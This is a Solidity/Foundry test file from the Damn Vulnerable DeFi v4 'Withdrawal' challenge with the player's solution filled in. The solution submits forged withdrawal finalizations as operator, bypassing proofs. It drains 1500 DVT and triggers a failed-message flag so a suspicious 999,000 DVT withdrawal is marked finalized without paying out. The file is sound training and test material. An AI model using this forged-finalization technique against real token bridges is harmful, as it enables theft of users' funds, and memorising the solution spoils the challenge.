// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        // Strategy:
        // 1) As operator, submit a FAKE finalize that drains ~1500 DVT to
        //    a junk address — this brings totalDeposits below 999,000 DVT.
        // 2) Submit another FAKE finalize whose inner message is EXACTLY
        //    W2's (executeTokenWithdrawal(0xea475..., 999_000e18)). The
        //    TokenBridge call reverts on underflow (totalDeposits < amount),
        //    and L1Forwarder records failedMessages[W2_messageId] = true.
        // 3) Finalize W0, W1, W3 normally (30 DVT drained to their recipients).
        // 4) Finalize W2 → Forwarder's `require(!failedMessages[W2_id])`
        //    fails → revert → Gateway's assembly call reports success=false,
        //    but `finalizedWithdrawals[W2_leaf] = true` already happened
        //    before the call. TokenBridge was NOT called — no 999k drain.
        //
        // Final: bridge loses 1530 DVT < 1% → retained > 99%. All 4 leaves
        // finalized. counter ≥ 4.

        vm.warp(START_TIMESTAMP + 8 days);

        // (1) Drain 1500 DVT via fake finalize to bring totalDeposits < 999,000e18
        _finalizeOuter(100, 0x66729b63,
            _buildMessage(100, address(0xDEAD), 1500e18));

        // (2) Fake finalize with W2's EXACT inner message → TokenBridge underflow
        //     → failedMessages[W2_messageId] = true
        _finalizeOuter(101, 0x66729b63,
            _buildMessage(2, 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999_000e18));

        // (3) Finalize W0, W1, W3 legitimately (each 10 DVT)
        _finalizeOuter(0, 0x66729b63,
            _buildMessage(0, 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 10e18));

        _finalizeOuter(1, 0x66729b95,
            _buildMessage(1, 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 10e18));

        _finalizeOuter(3, 0x66729c37,
            _buildMessage(3, 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10e18));

        // (4) Submit W2 — Forwarder reverts because failedMessages[W2_id] is true,
        //     but the leaf is finalized in the gateway
        _finalizeOuter(2, 0x66729bea,
            _buildMessage(2, 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999_000e18));
    }

    function _finalizeOuter(uint256 outerNonce, uint256 timestamp, bytes memory message) internal {
        bytes32[] memory empty;
        l1Gateway.finalizeWithdrawal(outerNonce, l2Handler, address(l1Forwarder), timestamp, message, empty);
    }

    function _buildMessage(uint256 nonce, address user, uint256 amount) internal view returns (bytes memory) {
        bytes memory innerMessage = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", user, amount);
        return abi.encodeWithSignature(
            "forwardMessage(uint256,address,address,bytes)",
            nonce, user, address(l1TokenBridge), innerMessage
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
